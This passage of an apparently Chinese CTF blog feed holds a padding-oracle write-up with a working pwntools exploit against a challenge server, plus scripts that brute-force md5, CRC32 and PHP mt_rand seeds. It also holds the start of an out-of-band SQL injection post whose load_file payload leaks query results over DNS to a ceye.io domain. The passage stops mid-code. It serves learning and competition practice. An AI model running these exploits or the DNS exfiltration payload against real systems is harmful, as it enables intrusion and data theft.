&apos;2. Encrypt the message&apos;</div><div class="line">    puts &apos;3. Decrypt the message.&apos;</div><div class="line">    puts &apos;Give your option:&apos;</div><div class="line">    STDOUT.flush</div><div class="line">    op=gets</div><div class="line">    return op.to_i</div><div class="line">end</div><div class="line"></div><div class="line">def init()</div><div class="line">    file_key=File.new(&quot;./aeskey&quot;,&quot;r&quot;)</div><div class="line">    $key=file_key.gets</div><div class="line">    file_key.close()</div><div class="line">end</div><div class="line">def aes_encrypt(iv,data)</div><div class="line">    cipher = OpenSSL::Cipher::AES.new(256, :CBC)</div><div class="line">    cipher.encrypt</div><div class="line">    cipher.key = $key</div><div class="line">    cipher.iv  = iv</div><div class="line">    cipher.update(data) &lt;&lt; cipher.final</div><div class="line">end</div><div class="line"></div><div class="line">def aes_decrypt(iv,data)</div><div class="line">    cipher = OpenSSL::Cipher::AES.new(256, :CBC)</div><div class="line">    cipher.decrypt</div><div class="line">    cipher.key = $key</div><div class="line">    cipher.iv  = iv</div><div class="line">    data = cipher.update(data) &lt;&lt; cipher.final</div><div class="line">end</div><div class="line"></div><div class="line">def output_secret()</div><div class="line">    file_secret=File.new(&quot;./flag&quot;,&quot;r&quot;)</div><div class="line">    secret=file_secret.gets</div><div class="line">    file_secret.close</div><div class="line">    secret_enc=aes_encrypt(&quot;A&quot;*16,secret)</div><div class="line">    secret_enc_b64=Base64.encode64(secret_enc)</div><div class="line">    puts secret_enc_b64 </div><div class="line">end</div><div class="line"></div><div class="line">init</div><div class="line">banner</div><div class="line">while true do</div><div class="line">    begin</div><div class="line">        op=option</div><div class="line">        if op==1</div><div class="line">            output_secret</div><div class="line">        elsif op==2</div><div class="line">            puts &quot;IV:&quot;</div><div class="line">            STDOUT.flush</div><div class="line">            iv=Base64.decode64(gets)</div><div class="line">            puts &quot;Data:&quot;</div><div class="line">            STDOUT.flush</div><div class="line">            data=Base64.decode64(gets)</div><div class="line">            data_enc=aes_encrypt iv,data</div><div class="line">            puts Base64.encode64(data_enc)</div><div class="line">            puts &quot;Encrytion Done&quot;    </div><div class="line">            STDOUT.flush</div><div class="line">        elsif op==3</div><div class="line">            puts &quot;IV:&quot;</div><div class="line">            STDOUT.flush</div><div class="line">            iv=Base64.decode64(gets)</div><div class="line">            puts &quot;Data:&quot;</div><div class="line">            STDOUT.flush</div><div class="line">            data=Base64.decode64(gets)</div><div class="line">            data_dec=aes_decrypt iv,data</div><div class="line">            puts &quot;Decrpytion Done&quot;</div><div class="line">            STDOUT.flush</div><div class="line">        else</div><div class="line">            puts &apos;Wrong Option&apos;</div><div class="line">            STDOUT.flush</div><div class="line">        end</div><div class="line">    rescue Exception =&gt; e  </div><div class="line">        puts e.message</div><div class="line">        STDOUT.flush</div><div class="line">        retry</div><div class="line">    end</div><div class="line">end</div></pre></td></tr></table></figure></p><p>这个题是<code>aes</code>的<code>cbc 256bit</code>加密方式，从给出的脚本可以看出，我们可以得到flag的密文，而且我们可以通过操作3得知我们输入的iv和密文是否符合格式，所以，可以使用<strong>padding oracle attack</strong>。这个密文长48个字节，所以，这是分成3块的cbc加密，第一块密文原本使用原来的iv: <code>AAAAAAAAAAAAAAAA</code>作为iv来进行解密，第二块它使用第一块密文来进行解密，第三块使用第二块密文进行解密。这个加密过程，我们要不断更换iv，因为我们知道cbc模式是密文使用key进行加密得到一个中间值，中间值与iv逐位异或得到明文。根据padding的原理，我们只要一位一位进行爆破，求出中间值就好。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"># coding=utf-8</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">Cipher_Text = &apos;s\xf8\x804*S=\x06\x9b=,3\xea,E*\xaa\xc1\xcd\xf6\xcc\xb8\x1eQ\xf0\x81\xa9\x0e\xa4\x11\xfe\x9e\xdb\xd6\xbfm\xe7\xba\xb5\x02\xda\xbd\xb9\xc5\x1b\x7f\xb4\x90&apos;</div><div class="line">block1 = Cipher_Text[:16]</div><div class="line">block2 = Cipher_Text[16:32]</div><div class="line">block3 = Cipher_Text[32:]</div><div class="line">Origin_IV = &apos;A&apos;*16</div><div class="line">#Origin_IV = block1</div><div class="line">#Origin_IV = block2</div><div class="line"></div><div class="line">p = remote(&apos;106.75.98.74&apos;,10010)</div><div class="line"></div><div class="line">def Padding_Oracle_Attack(New_IV):</div><div class="line">    p.recvuntil(&apos;option:\n&apos;)</div><div class="line">    p.send(&apos;3\n&apos;)</div><div class="line">    p.recvuntil(&apos;IV:\n&apos;)</div><div class="line">    p.send(New_IV)</div><div class="line">    p.recvuntil(&quot;Data:\n&quot;)</div><div class="line">    p.send(block1.encode(&apos;base64&apos;))</div><div class="line">    response = p.recvline()</div><div class="line">    print response</div><div class="line">    if &quot;Decrpytion Done&quot; in response:</div><div class="line">        print &apos;find true iv byte&apos;</div><div class="line">        print New_IV</div><div class="line">        return 1</div><div class="line">    else:</div><div class="line">        print &apos;false&apos;</div><div class="line"></div><div class="line">Clear_Text = &apos;&apos;</div><div class="line">Known_Byte_IV = &apos;&apos;</div><div class="line">Known_Byte_Intermediary = &apos;&apos;</div><div class="line"></div><div class="line">#因为AES分组长度为16，所以Padding可以达到0x0f，而不是像DES的0x08</div><div class="line">for Now_Padding in xrange(1,17):</div><div class="line">    #将已知的Intermediary Byte与当前需要构造的填充进行XOR,来构造出后面几位的IV</div><div class="line">    for byte in Known_Byte_Intermediary:</div><div class="line">        Known_Byte_IV += chr(ord(byte)^Now_Padding) </div><div class="line"></div><div class="line">    #开始遍历0x00-0xFF</div><div class="line">    for i in xrange(0,256):</div><div class="line">        #未知的Intermediary Byte所对应的IV用&apos;0&apos;来补齐</div><div class="line">        Unknown_Byte_IV = (15-len(Known_Byte_Intermediary)) * chr(0)</div><div class="line">        New_IV = Unknown_Byte_IV +chr(i)+Known_Byte_IV</div><div class="line"></div><div class="line">        if Padding_Oracle_Attack(New_IV.encode(&apos;base64&apos;)):</div><div class="line">            Now_Byte_Intermediary = chr(i^Now_Padding)</div><div class="line">            Known_Byte_Intermediary = Now_Byte_Intermediary+Known_Byte_Intermediary</div><div class="line"></div><div class="line">            Clear_Text_Byte = chr(Now_Byte_Intermediary^ord(Origin_IV[16-Now_Padding]))</div><div class="line">            Clear_Text = Clear_Text_Byte+Clear_Text</div><div class="line"></div><div class="line">            print Clear_Text</div><div class="line">            Known_Byte_IV = &apos;&apos;</div><div class="line">            break</div></pre></td></tr></table></figure></p><p>分三次跑出三组的值，连起来就是flag。<br><br></p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[https://github.com/mpgn/Padding-oracle-attack](https://github.com/mpgn/Padding-oracle-attack)</div><div class="line">[https://github.com/GDSSecurity/PadBuster](https://github.com/GDSSecurity/PadBuster)</div></pre></td></tr></table></figure></p><p>我感觉这种题目还是不适合用工具(因为我也没看懂这些工具怎么用)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;道哥的《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式，据说这货在2011年的Pwnie Rewards上还被评为”最具价值的服务器漏洞”。而且比赛中经常遇到，而且一般都是混在&lt;code&gt;web&lt;/code&gt;题里的&lt;code&gt;crypto&lt;/code&gt;。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>爆破脚本</title>
    <link href="http://Err0rzz.github.io/2017/11/23/%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/"/>
    <id>http://Err0rzz.github.io/2017/11/23/爆破脚本/</id>
    <published>2017-11-23T04:39:56.000Z</published>
    <updated>2017-11-23T04:51:28.142Z</updated>
    
    <content type="html"><![CDATA[<p>有时比赛需要爆破一些东西，比如密钥种子，md5验证这种，觉得还是保存一下脚本代码，遇到的时候就可以直接修改一下用了。</p><a id="more"></a><h1 id="md5验证爆破"><a href="#md5验证爆破" class="headerlink" title="md5验证爆破"></a>md5验证爆破</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf8 -*-</div><div class="line">import hashlib</div><div class="line"> </div><div class="line">def crack_code(code):</div><div class="line">    s = 100000</div><div class="line"> </div><div class="line">    while 1:</div><div class="line">        m2 = hashlib.md5()  </div><div class="line">        m2.update(repr(s))</div><div class="line">        if (m2.hexdigest()[0:4]==code):</div><div class="line">            return s</div><div class="line">            break</div><div class="line">        s+=1</div><div class="line"> </div><div class="line">print crack_code(&apos;818d&apos;)</div></pre></td></tr></table></figure><p><br></p><h1 id="crc爆破"><a href="#crc爆破" class="headerlink" title="crc爆破"></a>crc爆破</h1><p>速度来说，c比python快很多，推荐用c</p><p>python版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">import zipfile,os</div><div class="line">import binascii</div><div class="line">def CRCcheck(crcs):</div><div class="line">for a in r:</div><div class="line">for b in r:</div><div class="line">for c in r:</div><div class="line">for d in r:</div><div class="line">for e in r:</div><div class="line">temp=chr(a)+chr(b)+chr(c)+chr(d)+chr(e);</div><div class="line"></div><div class="line">crc=binascii.crc32(temp);</div><div class="line"></div><div class="line">crc1=crc &amp; 0xFFFFFFFF;</div><div class="line">if (crc1 == crcs)or (hex(crc1)==crcs):</div><div class="line">f.write(temp);</div><div class="line">print &quot;ok&quot;</div><div class="line">return ;</div><div class="line"></div><div class="line">rootname=&apos;C:\\Users\\geqiang\\Desktop\\misc\\zippy&apos;;</div><div class="line">f=open(&quot;F:\\zippy.txt&quot;,&apos;a&apos;);</div><div class="line"></div><div class="line">r=range(32,127);</div><div class="line">for i in range(0,54):</div><div class="line">name=&quot;chunk&quot;+str(i)+&quot;.zip&quot;;</div><div class="line">print name;</div><div class="line">zipFile=zipfile.ZipFile(os.path.join(os.getcwd(), rootname+&quot;\\&quot;+name));</div><div class="line">zipinfo=zipFile.getinfo(&apos;data.txt&apos;);</div><div class="line">crcs=zipinfo.CRC;</div><div class="line">print crcs</div><div class="line">CRCcheck(crcs);</div></pre></td></tr></table></figure></p><p>c版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"># include&lt;string.h&gt;</div><div class="line"># include &lt;stdio.h&gt;</div><div class="line">//来自：https://github.com/ETrun/crc32/blob/master/crc32.c</div><div class="line">static unsigned long Crc32_ComputeBuf(const void *buf, size_t bufLen) &#123;</div><div class="line">static const unsigned long crcTable[256] = &#123;</div><div class="line">0x00000000,0x77073096,0xEE0E612C,0x990951BA,0x076DC419,0x706AF48F,0xE963A535,</div><div class="line">0x9E6495A3,0x0EDB8832,0x79DCB8A4,0xE0D5E91E,0x97D2D988,0x09B64C2B,0x7EB17CBD,</div><div class="line">0xE7B82D07,0x90BF1D91,0x1DB71064,0x6AB020F2,0xF3B97148,0x84BE41DE,0x1ADAD47D,</div><div class="line">0x6DDDE4EB,0xF4D4B551,0x83D385C7,0x136C9856,0x646BA8C0,0xFD62F97A,0x8A65C9EC,</div><div class="line">0x14015C4F,0x63066CD9,0xFA0F3D63,0x8D080DF5,0x3B6E20C8,0x4C69105E,0xD56041E4,</div><div class="line">0xA2677172,0x3C03E4D1,0x4B04D447,0xD20D85FD,0xA50AB56B,0x35B5A8FA,0x42B2986C,</div><div class="line">0xDBBBC9D6,0xACBCF940,0x32D86CE3,0x45DF5C75,0xDCD60DCF,0xABD13D59,0x26D930AC,</div><div class="line">0x51DE003A,0xC8D75180,0xBFD06116,0x21B4F4B5,0x56B3C423,0xCFBA9599,0xB8BDA50F,</div><div class="line">0x2802B89E,0x5F058808,0xC60CD9B2,0xB10BE924,0x2F6F7C87,0x58684C11,0xC1611DAB,</div><div class="line">0xB6662D3D,0x76DC4190,0x01DB7106,0x98D220BC,0xEFD5102A,0x71B18589,0x06B6B51F,</div><div class="line">0x9FBFE4A5,0xE8B8D433,0x7807C9A2,0x0F00F934,0x9609A88E,0xE10E9818,0x7F6A0DBB,</div><div class="line">0x086D3D2D,0x91646C97,0xE6635C01,0x6B6B51F4,0x1C6C6162,0x856530D8,0xF262004E,</div><div class="line">0x6C0695ED,0x1B01A57B,0x8208F4C1,0xF50FC457,0x65B0D9C6,0x12B7E950,0x8BBEB8EA,</div><div class="line">0xFCB9887C,0x62DD1DDF,0x15DA2D49,0x8CD37CF3,0xFBD44C65,0x4DB26158,0x3AB551CE,</div><div class="line">0xA3BC0074,0xD4BB30E2,0x4ADFA541,0x3DD895D7,0xA4D1C46D,0xD3D6F4FB,0x4369E96A,</div><div class="line">0x346ED9FC,0xAD678846,0xDA60B8D0,0x44042D73,0x33031DE5,0xAA0A4C5F,0xDD0D7CC9,</div><div class="line">0x5005713C,0x270241AA,0xBE0B1010,0xC90C2086,0x5768B525,0x206F85B3,0xB966D409,</div><div class="line">0xCE61E49F,0x5EDEF90E,0x29D9C998,0xB0D09822,0xC7D7A8B4,0x59B33D17,0x2EB40D81,</div><div class="line">0xB7BD5C3B,0xC0BA6CAD,0xEDB88320,0x9ABFB3B6,0x03B6E20C,0x74B1D29A,0xEAD54739,</div><div class="line">0x9DD277AF,0x04DB2615,0x73DC1683,0xE3630B12,0x94643B84,0x0D6D6A3E,0x7A6A5AA8,</div><div class="line">0xE40ECF0B,0x9309FF9D,0x0A00AE27,0x7D079EB1,0xF00F9344,0x8708A3D2,0x1E01F268,</div><div class="line">0x6906C2FE,0xF762575D,0x806567CB,0x196C3671,0x6E6B06E7,0xFED41B76,0x89D32BE0,</div><div class="line">0x10DA7A5A,0x67DD4ACC,0xF9B9DF6F,0x8EBEEFF9,0x17B7BE43,0x60B08ED5,0xD6D6A3E8,</div><div class="line">0xA1D1937E,0x38D8C2C4,0x4FDFF252,0xD1BB67F1,0xA6BC5767,0x3FB506DD,0x48B2364B,</div><div class="line">0xD80D2BDA,0xAF0A1B4C,0x36034AF6,0x41047A60,0xDF60EFC3,0xA867DF55,0x316E8EEF,</div><div class="line">0x4669BE79,0xCB61B38C,0xBC66831A,0x256FD2A0,0x5268E236,0xCC0C7795,0xBB0B4703,</div><div class="line">0x220216B9,0x5505262F,0xC5BA3BBE,0xB2BD0B28,0x2BB45A92,0x5CB36A04,0xC2D7FFA7,</div><div class="line">0xB5D0CF31,0x2CD99E8B,0x5BDEAE1D,0x9B64C2B0,0xEC63F226,0x756AA39C,0x026D930A,</div><div class="line">0x9C0906A9,0xEB0E363F,0x72076785,0x05005713,0x95BF4A82,0xE2B87A14,0x7BB12BAE,</div><div class="line">0x0CB61B38,0x92D28E9B,0xE5D5BE0D,0x7CDCEFB7,0x0BDBDF21,0x86D3D2D4,0xF1D4E242,</div><div class="line">0x68DDB3F8,0x1FDA836E,0x81BE16CD,0xF6B9265B,0x6FB077E1,0x18B74777,0x88085AE6,</div><div class="line">0xFF0F6A70,0x66063BCA,0x11010B5C,0x8F659EFF,0xF862AE69,0x616BFFD3,0x166CCF45,</div><div class="line">0xA00AE278,0xD70DD2EE,0x4E048354,0x3903B3C2,0xA7672661,0xD06016F7,0x4969474D,</div><div class="line">0x3E6E77DB,0xAED16A4A,0xD9D65ADC,0x40DF0B66,0x37D83BF0,0xA9BCAE53,0xDEBB9EC5,</div><div class="line">0x47B2CF7F,0x30B5FFE9,0xBDBDF21C,0xCABAC28A,0x53B39330,0x24B4A3A6,0xBAD03605,</div><div class="line">0xCDD70693,0x54DE5729,0x23D967BF,0xB3667A2E,0xC4614AB8,0x5D681B02,0x2A6F2B94,</div><div class="line">0xB40BBE37,0xC30C8EA1,0x5A05DF1B,0x2D02EF8D</div><div class="line">&#125;;</div><div class="line">unsigned long crc32 = 0xFFFFFFFF;</div><div class="line">unsigned char *byteBuf;</div><div class="line">size_t i;</div><div class="line">byteBuf = (unsigned char*)buf;</div><div class="line">for (i = 0; i &lt; bufLen; i++) &#123;</div><div class="line">crc32 = (crc32 &gt;&gt; 8) ^ crcTable[(crc32 ^ byteBuf[i]) &amp; 0xFF];</div><div class="line">&#125;</div><div class="line">return crc32 ^ 0xFFFFFFFF;</div><div class="line">&#125;</div><div class="line">static char *charSet = &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@\n &quot;;</div><div class="line">int main() &#123;</div><div class="line">unsigned long crc32[] = &#123; 1606238046, 1943531056, 3598719407L, 2578797435L, 1405086858, 2143805016, 3234701029L, 3224637410L, </div><div class="line">2346013297L, 1146766327, 4038678768L, 3119445409L, 2111148220, 383413051, 2853461348L, 3176759361L, 1852520927, </div><div class="line">3083243303L, 2151747034L, 1392140456, 544449252, 1871340857, 574988077, 3459049483L, 2786065872L, 3888485555L, </div><div class="line">1716930793, 1933746678, 3178216769L, 3774357278L, 622718466, 1488109481, 525106857, 3123386181L, 3472027048L, </div><div class="line">616379830, 3728848209L, 1358333123, 1852520927, 3096466191L, 622718466</div><div class="line">&#125;;</div><div class="line">char tmp[6] = &quot;&quot;;</div><div class="line">int len = strlen(charSet);</div><div class="line">for (int h = sizeof(crc32) / sizeof(unsigned long) - 1;h&gt;=0; h--) &#123;</div><div class="line">for (int a = 0; a &lt; len; a++) &#123;</div><div class="line">tmp[0] = charSet[a];</div><div class="line">for (int b = 0; b &lt; len; b++) &#123;</div><div class="line">tmp[1] = charSet[b];</div><div class="line">for (int c = 0; c &lt; len; c++) &#123;</div><div class="line">tmp[2] = charSet[c];</div><div class="line">for (int d = 0; d &lt; len; d++) &#123;</div><div class="line">tmp[3] = charSet[d];</div><div class="line">for (int e = 0; e &lt; len; e++) &#123;</div><div class="line">tmp[4] = charSet[e];</div><div class="line">if (Crc32_ComputeBuf(tmp, strlen(tmp)) == crc32[h]) &#123;</div><div class="line">printf(&quot;%s&quot;, tmp);</div><div class="line">//goto label;//若是存在碰撞，那么这里可以将这里注释掉</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">label :;</div><div class="line">printf(&quot;\n&quot;);</div><div class="line">&#125;</div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><br></p><h1 id="种子密钥爆破"><a href="#种子密钥爆破" class="headerlink" title="种子密钥爆破"></a>种子密钥爆破</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">function auth_code($length = 12, $special = true)</div><div class="line">&#123;</div><div class="line">    $chars = </div><div class="line">&apos;abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;;</div><div class="line">    if ($special) &#123;</div><div class="line">        echo 1;</div><div class="line">        $chars .= &apos;!@#$%^&amp;*()&apos;;</div><div class="line">    &#125;</div><div class="line">    $password = &apos;&apos;;</div><div class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</div><div class="line">        $password .= substr($chars, mt_rand(0, strlen($chars) ‐ 1), 1);</div><div class="line">    &#125;</div><div class="line">    return $password;</div><div class="line">&#125;</div><div class="line">while(True)</div><div class="line">&#123;</div><div class="line">    $seed = rand(0,99999);</div><div class="line">    mt_srand($seed);</div><div class="line">    $key = auth_code(16, false);    if($key == &quot;k Cfnh ISk Ty Ip4a Ae&quot;)</div><div class="line">    &#123;</div><div class="line">        echo $seed;</div><div class="line">        echo &quot;\n&quot;;</div><div class="line">        break;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$private = auth_code(10, false);</div><div class="line">echo $private;</div><div class="line">echo &quot;\n&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有时比赛需要爆破一些东西，比如密钥种子，md5验证这种，觉得还是保存一下脚本代码，遇到的时候就可以直接修改一下用了。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OOB注入</title>
    <link href="http://Err0rzz.github.io/2017/11/16/OOB%E6%B3%A8%E5%85%A5/"/>
    <id>http://Err0rzz.github.io/2017/11/16/OOB注入/</id>
    <published>2017-11-16T11:52:06.000Z</published>
    <updated>2018-01-09T06:10:10.714Z</updated>
    
    <content type="html"><![CDATA[<p>源于HCTF2017的一道题目，看来自己还是太年轻了，这种注入自己以前一直没见过，然后一搜一大把。</p><a id="more"></a><p>SQL注入类型细分，分为以下5种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1. Boolean-based blind SQL injection </div><div class="line">2. Error-based SQL injection</div><div class="line">3. UNION query SQL injection</div><div class="line">4. Stacked queries SQL injection</div><div class="line">5. Time-based blind SQL injection</div></pre></td></tr></table></figure></p><p>共计3大类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. inband</div><div class="line">2. inference</div><div class="line">3. out of band(OOB)</div></pre></td></tr></table></figure></p><p><strong>OOB</strong>与我们熟知的inband类的注入相反。inband是利用web应用来直接获取数据，比如Error-based SQL injection和UNION query SQL injection都是属于inband类，它们都是通过web的响应或者错误反馈来提取数据。</p><p>而inference则是通过web的一些反映来推断数据，比如Boolean-based blind SQL injection和Stacked queries SQL injection 也就是我们通俗的盲注，通过web应用的其他改变来推断数据。</p><p>我们的主角OOB则是通过其他传输方式来获得数据，比如利用我们等会要说到的DNS解析协议和电子邮件。当你遇到了某些很隐蔽的注入点，inband类注入没办法用，inference类注入被你嫌弃太慢的时候，OOB就是你最好的选择了。</p><p>如何查看mysql是否开启了文件导入导出？<br><code>mysql&gt;show global variables like &#39;%secure%&#39;;</code><br>如果<code>secure_file_priv</code>的值为<code>null</code>，则没开启；如果为空，则开启；如果为目录，则说明只能在该目录下操作。</p><p>如何修改<code>secure_file_priv</code>？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</div><div class="line">linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</div><div class="line">MYSQL新特性secure_file_priv对读写文件的影响</div><div class="line">然后重启mysql，再查询secure_file_priv</div></pre></td></tr></table></figure></p><p>原理什么的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[http://bobao.360.cn/learning/detail/3458.html](http://bobao.360.cn/learning/detail/3458.html)</div><div class="line">[http://www.freebuf.com/vuls/138838.html](http://www.freebuf.com/vuls/138838.html)</div><div class="line">[http://www.jianshu.com/p/95c814c515a2](http://www.jianshu.com/p/95c814c515a2)</div></pre></td></tr></table></figure></p><p>大致就是如果目标服务器是搭在win下，且有能操控文件的函数，且配置不当，如mysql中的<strong>secure_file_priv</strong>全局系统变量配置问题，就有可能会触发<strong>OOB注入</strong>。注入过程呢，是通过那些函数，例如load_file()去发送DNS请求，然后将我们的查询语句构造在DNS查询中，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">利用payload是：load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\abc&apos;))</div><div class="line">concat是字符串拼接</div><div class="line">database()就是你要做SQL注入查询的地方</div><div class="line">&apos;.xxxx.ceye.io\abc&apos;就是你的dnslog平台给你的域名</div><div class="line">后面的abc可以改也可以不改，无所谓的，你乐意写啥就写啥</div></pre></td></tr></table></figure></p><p>这里的域名是在<a href="http://ceye.io/" target="_blank" rel="external">http://ceye.io/</a>中注册得到的。</p><h1 id="boring-website"><a href="#boring-website" class="headerlink" title="boring website"></a>boring website</h1><p>这是HCTF2017的一道题目。<br>题目：<a href="https://github.com/hammerorz/HCTF2017-easy-sign-and-boring-website" target="_blank" rel="external">https://github.com/hammerorz/HCTF2017-easy-sign-and-boring-website</a><br>wp：<a href="https://xianzhi.aliyun.com/forum/topic/1589/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1589/</a></p><p>知道了这个注入之后就很好做了，直接抄wp了</p><p>发现应该是<code>sql server</code>用<code>linkserver</code>来连接<code>mysql</code>。所以去查了一波<code>linkserver</code>的用法，以及结合注释可得<code>select * from openquery(mysql,&#39;select xxx&#39;)</code>可以从<code>mysql</code>数据库中查得信息，但是没有回显，<code>sleep</code>函数也被ban了，然后看到oob的提示，去查了一波<code>mysql out-of-band</code>，发现<code>load_file</code>函数可以通过dns通道把所查得的数据带出来。接下来的过程就是十分常见简单的mysql注入的流程。</p><p>这里值得另外一提的是，本来不知道原来还能用<code>openquery</code>来进行连接不同的服务器，又学到了。</p><p>我将题目重新搭了一下，不过因为本地没有安装sql server，所以就没有搭sql servser环境，只是复现了<code>load_file</code>的<code>dns</code>查询。而一开始没有成功，发现是少了配置条件，没有配置<strong>secure-file-priv</strong>。截图如下：</p><p><strong>本地数据库信息</strong><br><img src="https://i.imgur.com/Kt2bOVq.png" alt=""></p><p><strong>重新搭的题目源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div 